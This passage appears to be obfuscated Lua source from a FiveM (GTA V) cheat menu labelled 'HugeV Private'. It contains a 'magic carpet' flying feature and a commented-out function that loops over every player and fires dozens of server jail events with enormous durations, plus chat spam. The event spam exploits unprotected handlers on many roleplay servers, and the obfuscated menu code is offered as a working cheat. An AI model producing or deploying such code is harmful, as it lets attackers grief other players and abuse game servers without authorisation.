        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 100, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 142, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 143, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 263, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 264, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 257, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, HugeV_KEYSHTRHRTHTRH["C"], off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, HugeV_KEYSHTRHRTHTRH["F"], off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, HugeV_KEYSHTRHRTHTRH["LEFTCTRL"], off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, HugeV_KEYSHTRHRTHTRH["MOUSE1"], off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 25, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, HugeV_KEYSHTRHRTHTRH["R"], off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 45, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 80, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 140, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 250, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 263, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 310, off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, HugeV_KEYSHTRHRTHTRH["TAB"], off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, HugeV_KEYSHTRHRTHTRH["SPACE"], off_SDGHDSUIGSD)
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, HugeV_KEYSHTRHRTHTRH["X"], off_SDGHDSUIGSD)
    end
			
	local function DisableCombat_SDGHISUDGSD(off_SDGHDSUIGSD)
       Czitirzen_Invoke(0x5E6CC07646BBEAB8, Czitirzen_Invoke(0x4F8644AF03D0E0D6), off_SDGHDSUIGSD) -- Disable weapon firing
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 24, off_SDGHDSUIGSD) -- disable attack
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 25, off_SDGHDSUIGSD) -- disable aim
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 1, 37, off_SDGHDSUIGSD) -- disable weapon select
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 47, off_SDGHDSUIGSD) -- disable weapon
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 58, off_SDGHDSUIGSD) -- disable weapon
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 140, off_SDGHDSUIGSD) -- disable melee
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 141, off_SDGHDSUIGSD) -- disable melee
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 142, off_SDGHDSUIGSD) -- disable melee
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 143, off_SDGHDSUIGSD) -- disable melee
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 263, off_SDGHDSUIGSD) -- disable melee
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 264, off_SDGHDSUIGSD) -- disable melee
        Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 257, off_SDGHDSUIGSD) -- disable melee
    end
	
    local function rot_to_dir_DSGIHSDGSDG(rot_SDHGYUDSGSD)
        local radZ_DSGHSIUDGHDSG = rot_SDHGYUDSGSD.z * 0.0174532924
        local radX_DSGHSIUDGHDSG = rot_SDHGYUDSGSD.x * 0.0174532924
        local num_DSIGUSIDG = math.abs(math.cos(radX_DSGHSIUDGHDSG))
        local dir_DSIGHIUSDG_SDGIHSDUGSD = vector3(-math.sin(radZ_DSGHSIUDGHDSG) * num_DSIGUSIDG, math.cos(radZ_DSGHSIUDGHDSG) * num_DSIGUSIDG, radX_DSGHSIUDGHDSG)

        return dir_DSIGHIUSDG_SDGIHSDUGSD
    end
	
    local function _multiply_SDGIHSIUGDSG(vector_DSGISDUIGDSG, mult_DSGHSDUIGSDG)
        return vector3(vector_DSGISDUIGDSG.x * mult_DSGHSDUIGSDG, vector_DSGISDUIGDSG.y * mult_DSGHSDUIGSDG, vector_DSGISDUIGDSG.z * mult_DSGHSDUIGSDG)
    end
			
	local function _do_riding_SDGUDSHIGHSDYG()
        if not magic_riding_SDGHSIDUGSDG then
            Czitirzen_Invoke(0xE1EF3C1216AFF2CD, Czitirzen_Invoke(0xD80958FC74E988A6))
            local rot_SDHGYUDSGSD = GetEntityRotation_HugeV_DSGUHSDUYGUSD(magic_carpet_obj)
            Czitirzen_Invoke(0x8524A8B0171D5E07, magic_carpet_obj, 0.0, rot_SDHGYUDSGSD.y, rot_SDHGYUDSGSD.z)
        else
            local coords_DSIGSDGSD = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(Czitirzen_Invoke(0xD80958FC74E988A6), 0.0, 0.0, 0.0)
            local carpet_DSGUSDHIGDS = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(magic_carpet_obj, 0.0, 0.0, 0.0)
            local head_DSGHDSIUGDS = GetEntityHeading_HugeV_UDYUGDHIGKDFG(magic_carpet_obj)
            Czitirzen_Invoke(0x8E2530AA8ADA980E, Czitirzen_Invoke(0xD80958FC74E988A6), head_DSGHDSIUGDS)
            Czitirzen_Invoke(0x06843DA7060A026B, Czitirzen_Invoke(0xD80958FC74E988A6), carpet_DSGUSDHIGDS.x, carpet_DSGUSDHIGDS.y, carpet_DSGUSDHIGDS.z)
            Czitirzen_Invoke(0xEA47FE3719165B94, Czitirzen_Invoke(0xD80958FC74E988A6), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
        end
    end

    local function _right_vec_SDGHSIUDGSDHUG()
        local right_DSIGHIDSUGSD = vector3(0, 1, 0)

        return right_DSIGHIDSUGSD
    end

    local function _up_vec_DSIGHSDIUGSD()
        local up_DSGUSD = vector3(0, 0, 1)

        return up_DSGUSD
    end

    local function _do_flying_SDGUSHDIGSDG()
        if not magic_riding_SDGHSIDUGSDG then return end
        DisableMovement_DSIGHDSIUGSD(true)

        if not Czitirzen_Invoke(0x1F0B79228E461EC9, Czitirzen_Invoke(0xD80958FC74E988A6), "rcmcollect_paperleadinout@", "meditiate_idle", 3) then
            Czitirzen_Invoke(0xEA47FE3719165B94, Czitirzen_Invoke(0xD80958FC74E988A6), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
        end

        local carpet_DSGUSDHIGDS = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(magic_carpet_obj, 0.0, 0.0, 0.0)
        local rot_SDHGYUDSGSD = GetGameplayCamRot_HugeV_DSUGHSDUIGSD(0)

            Czitirzen_Invoke(0x8524A8B0171D5E07, magic_carpet_obj, rot_SDHGYUDSGSD.x + 0.0, rot_SDHGYUDSGSD.y + 0.0, rot_SDHGYUDSGSD.z + 0.0)
            local forwardVec = 
			GetEntityForwardVector_HugeV_SDGHSDIUGSD(magic_carpet_obj)
            local rightVec_DSIGHSDIUGSD = _right_vec_SDGHSIUDGSDHUG(magic_carpet_obj)
            local upVec_SDGUSDHIGSD = _up_vec_DSIGHSDIUGSD(magic_carpet_obj)
            local speed_DSGYSDIUGDS = 1.0

            if IsDisabledControlPressed_HugeV_DSUHGSUDGD(0, HugeV_KEYSHTRHRTHTRH["LEFTCTRL"]) then
                speed_DSGYSDIUGDS = 0.1
            elseif IsDisabledControlPressed_HugeV_DSUHGSUDGD(0, HugeV_KEYSHTRHRTHTRH["LEFTSHIFT"]) then
                speed_DSGYSDIUGDS = 2.8
            end

            if IsDisabledControlPressed_HugeV_DSUHGSUDGD(0, HugeV_KEYSHTRHRTHTRH["W"]) then
                carpet_DSGUSDHIGDS = carpet_DSGUSDHIGDS + forwardVec * speed_DSGYSDIUGDS
            end

            if IsDisabledControlPressed_HugeV_DSUHGSUDGD(0, HugeV_KEYSHTRHRTHTRH["S"]) then
                carpet_DSGUSDHIGDS = carpet_DSGUSDHIGDS - forwardVec * speed_DSGYSDIUGDS
            end

            if IsDisabledControlPressed_HugeV_DSUHGSUDGD(0, HugeV_KEYSHTRHRTHTRH["SPACE"]) then
                carpet_DSGUSDHIGDS = carpet_DSGUSDHIGDS + upVec_SDGUSDHIGSD * speed_DSGYSDIUGDS
            end

            if IsDisabledControlPressed_HugeV_DSUHGSUDGD(0, HugeV_KEYSHTRHRTHTRH["X"]) then
                carpet_DSGUSDHIGDS = carpet_DSGUSDHIGDS - upVec_SDGUSDHIGSD * speed_DSGYSDIUGDS
            end

            Czitirzen_Invoke(0x06843DA7060A026B, magic_carpet_obj, carpet_DSGUSDHIGDS.x, carpet_DSGUSDHIGDS.y, carpet_DSGUSDHIGDS.z)

        Czitirzen_Invoke(0x8524A8B0171D5E07, Czitirzen_Invoke(0xD80958FC74E988A6), rot_SDHGYUDSGSD.x, rot_SDHGYUDSGSD.y, rot_SDHGYUDSGSD.z)
        Czitirzen_Invoke(0x6B9BBD38AB0796DF, Czitirzen_Invoke(0xD80958FC74E988A6), magic_carpet_obj, 0, 0.0, 0.0, 1.0, rot_SDHGYUDSGSD.x, GetEntityHeading_HugeV_UDYUGDHIGKDFG(magic_carpet_obj), rot_SDHGYUDSGSD.z, false, false, false, false, 1, false)
    end

    local _no_combat_SDGUSDHIGSD
    local _was_no_combat_DSGISDIGSDG

    CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
        while Wlaczone_Menu_XD_dugao8iugsgsergsdfg do
            Czlowiek_Wait_IDYGOSIFJGDFG(0)

            if _no_combat_SDGUSDHIGSD and not _was_no_combat_DSGISDIGSDG then
                _was_no_combat_DSGISDIGSDG = true
            elseif not _no_combat_SDGUSDHIGSD and _was_no_combat_DSGISDIGSDG then
                _was_no_combat_DSGISDIGSDG = false
                DisableCombat_SDGHISUDGSD(_no_combat_SDGUSDHIGSD)
            end

            if _no_combat_SDGUSDHIGSD then
                DisableCombat_SDGHISUDGSD(_no_combat_SDGUSDHIGSD)
            end
        end
    end)

    CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
        RequestModelSync_SDUFHSIDGSDG("apa_mp_h_acc_rugwoolm_03")
        Czitirzen_Invoke(0xD3BD40951412FEF6, "rcmcollect_paperleadinout@")

        while Wlaczone_Menu_XD_dugao8iugsgsergsdfg do
            Czlowiek_Wait_IDYGOSIFJGDFG(0)

            if MagicCarpet_DSUGSIGSDGSD then
                local our_cam = GetRenderingCam()

                if not magic_carpet_obj or not Czitirzen_Invoke(0x7239B21A38F536BA, magic_carpet_obj) then
                    local cur_SDGSIDGSDGSD = GetGameplayCamCoord()
                    local _dir_SDGISDGDSG = GetGameplayCamRot_HugeV_DSUGHSDUIGSD(0)
                    local dir_DSIGHIUSDG_SDGIHSDUGSD = rot_to_dir_DSGIHSDGSDG(_dir_SDGISDGDSG)
                    local dist_DSGUSDIGDS = 100.0
                    local len_SDUGHSIDGSD = _multiply_SDGIHSIUGDSG(dir_DSIGHIUSDG_SDGIHSDUGSD, dist_DSGUSDIGDS)
                    local targ_SDGHSDIUGSD = cur_SDGSIDGSDGSD + len_SDUGHSIDGSD
                    local handle_SDIGJSIUDGSD = Czitirzen_Invoke(0x377906D8A31E5586, cur_SDGSIDGSDGSD.x, cur_SDGSIDGSDGSD.y, cur_SDGSIDGSDGSD.z, targ_SDGHSDIUGSD.x, targ_SDGHSDIUGSD.y, targ_SDGHSDIUGSD.z, 1, preview_magic_carpet)
                    local _, hit_SDGJSUDIGSD, hit_pos_DSGIUSDGSD, _, entity_DSIGHSIDUG = GetShapeTestResult_HugeV_DSUGHIDSUGS(handle_SDIGJSIUDGSD)

                    if not preview_magic_carpet or not Czitirzen_Invoke(0x7239B21A38F536BA, preview_magic_carpet) then
                        _no_combat_SDGUSDHIGSD = true
                        preview_magic_carpet = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "apa_mp_h_acc_rugwoolm_03"), hit_pos_DSGIUSDGSD.x, hit_pos_DSGIUSDGSD.y, hit_pos_DSGIUSDGSD.z + 0.5, false, true, true)
                        Czitirzen_Invoke(0x1A9205C1B9EE827F, preview_magic_carpet, false, false)
						Czitirzen_Invoke(0x44A0870B7E92D7C0, preview_magic_carpet, 100)
                        Czlowiek_Wait_IDYGOSIFJGDFG(50)
                    elseif hit_SDGJSUDIGSD then
                        Czitirzen_Invoke(0x06843DA7060A026B, preview_magic_carpet, hit_pos_DSGIUSDGSD.x, hit_pos_DSGIUSDGSD.y, hit_pos_DSGIUSDGSD.z + 0.5)
                        Czitirzen_Invoke(0x44A0870B7E92D7C0, preview_magic_carpet, 100)
                        Czitirzen_Invoke(0x428CA6DBD1094446, preview_magic_carpet, true)
						Czitirzen_Invoke(0x8524A8B0171D5E07, preview_magic_carpet, 0.0, 0.0, _dir_SDGISDGDSG.z + 0.0)
                        Czitirzen_Invoke(0x1A9205C1B9EE827F, preview_magic_carpet, false, false)
                    end

                    if IsDisabledControlPressed_HugeV_DSUHGSUDGD(0, HugeV_KEYSHTRHRTHTRH["MOUSE1"]) and not Showing then
                        magic_carpet_obj = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "apa_mp_h_acc_rugwoolm_03"), hit_pos_DSGIUSDGSD.x, hit_pos_DSGIUSDGSD.y, hit_pos_DSGIUSDGSD.z + 0.5, true, true, true)
                        DoNetwork_DSIGHISUDGSDG(magic_carpet_obj)
                        local rot_SDHGYUDSGSD = GetEntityRotation_HugeV_DSGUHSDUYGUSD(preview_magic_carpet)
                        Czitirzen_Invoke(0x8524A8B0171D5E07, magic_carpet_obj, rot_SDHGYUDSGSD)
                        Czitirzen_Invoke(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(preview_magic_carpet))
                        _no_combat_SDGUSDHIGSD = false
                    end
                else
                    Czitirzen_Invoke(0x428CA6DBD1094446, magic_carpet_obj, true)
                    _do_flying_SDGUSHDIGSDG()
                    local coords_DSIGSDGSD = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(Czitirzen_Invoke(0xD80958FC74E988A6), 0.0, 0.0, 0.0)
                    local carpet_DSGUSDHIGDS = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(magic_carpet_obj, vector_origin)
                    local dist_DSGUSDIGDS = GetDistanceBetweenCoords_HugeV_UDHGIUSDHGIUDF(coords_DSIGSDGSD.x, coords_DSIGSDGSD.y, coords_DSIGSDGSD.z, carpet_DSGUSDHIGDS.x, carpet_DSGUSDHIGDS.y, carpet_DSGUSDHIGDS.z)

                    if dist_DSGUSDIGDS <= 5.0 then
                        DrawText3D_HugeV_UDGUYSDHUGSFFDG(carpet_DSGUSDHIGDS.x, carpet_DSGUSDHIGDS.y, carpet_DSGUSDHIGDS.z, "Press [E] to get ".. (magic_riding_SDGHSIDUGSDG and "off"or "on") .. ".", Tertiary_SDGUSDHGISDG[1], Tertiary_SDGUSDHGISDG[2], Tertiary_SDGUSDHGISDG[3])

                        if Czitirzen_Invoke(0x91AEF906BCA88877, 0, HugeV_KEYSHTRHRTHTRH["E"]) then
                            magic_riding_SDGHSIDUGSDG = not magic_riding_SDGHSIDUGSDG
                            _do_riding_SDGUDSHIGHSDYG()
                        end
                    end
                end
            else
                _no_combat_SDGUSDHIGSD = false

                if preview_magic_carpet and Czitirzen_Invoke(0x7239B21A38F536BA, preview_magic_carpet) then
                    Czitirzen_Invoke(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(preview_magic_carpet))
                end

                if magic_carpet_obj and Czitirzen_Invoke(0x7239B21A38F536BA, magic_carpet_obj) then
                   Czitirzen_Invoke(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(magic_carpet_obj))
                    Czitirzen_Invoke(0xE1EF3C1216AFF2CD, Czitirzen_Invoke(0xD80958FC74E988A6))
                end
            end
        end
    end)
			
			
--[[local function jailAllplayer_jguerhgurekge()
	for i_didsfyg98sduriesdfg=0, 255 do
	Czlowiek_Wait_IDYGOSIFJGDFG(2500)
			  TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 45 * 60)
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 45 * 60)
			TriggerServerEvent("js:jailuser", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 45 * 60, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 45 * 60)
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 45 * 60)
			TriggerServerEvent("js:jailuser", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail132", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:*", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:eloelo90", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:wwiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("searp:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJailtrop", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432, 'SenseiToUjJebanyWDupeCfelPierdolony1337Kurwo')
			TriggerServerEvent("17A34C820A685513C5B4ADDD85968B9E905CC300A261EB55D299ABCB6C90AAA872712B3B6C13DC41913FCC2BE84A07EF9300DC4E89669A4B0E6FBB344A69D239", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJail132", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:fabianfudalijebanyprzyglup", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5023432432434200, "HugeV Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 3000)
			TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 9999999999)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 9999999999)
			TriggerServerEvent("esx-jail:jailPlayer",   GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 3000)
			TriggerServerEvent("esx_jailer:jailhype", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 3000)
			TriggerServerEvent("esx_jailer:sendToJial", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 59999, "HugeV Private SKRRTTTT?", 9333397)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 59999, "HugeV Private SKRRTTTT?", 9333397)
			TriggerServerEvent("esx-jail:jailPlayer", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 9999999999)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 9999999999)
			TriggerServerEvent("esx_policejob:message", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), "HugeV Private SKRRTTTT")
			TriggerServerEvent("hazerp:wyslijdopaki", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 50000)
			TriggerServerEvent("8321hiue89js", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5007, "HugeV Private SKRRTTTT", 323434532532, securityToken)
			TriggerServerEvent("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 300000, "HugeV Private SKRRTTTT", 500324532)
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 999999999 * 60, "HugeV Private SKRRTTTT")
			TriggerServerEvent("js:jailuser", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(PlayerId()) .."HugeV Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 3000)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 300)
			TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 50000)
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent("js:jailuser", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 5000, "HugeV Private SKRRTTTT")
			TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(PlayerId()) .."HugeV Private SKRRTTTT")
			TriggerServerEvent('esx_policejob:zakujtypeczka',  GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg))
			TriggerServerEvent('esx_ruski_areszt:startAreszt', GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg))
			TriggerServerEvent("arisonarp:wiezienie", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9999999999 * 60, "HugeV Private SKRRTTTT", 1337)
			TriggerServerEvent("esx_jailer:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9999999 * 60)
			TriggerServerEvent("esx_jail:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9999999 * 60)
			TriggerServerEvent("js:jailuser", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 999999 * 60, "HugeV Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 999999 * 60, "HugeV Private SKRRTTTT")
			TriggerServerEvent("wysparp_tablet:SendMessage", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9999 * 60, "HugeV Private SKRRTTTT", 9999999999)
			TriggerServerEvent("wiezieniejailer:sendToJail",3, GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9999 * 60, "HugeV Private SKRRTTTT", 1,2137)
			TriggerServerEvent("esxjailer:sendToJail2", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent('esx:wiezienie', GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailers:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent("arisonarp:wiezienie",  GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent("esx_jail:sendTooJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailer:sendTooJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailer:sendToJailf", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailers:sendToJail", GetPlayerId_HugeV_OIDHUFIDSUGLFD(i_didsfyg98sduriesdfg), 9937, "HugeV Private SKRRTTTT", 1)
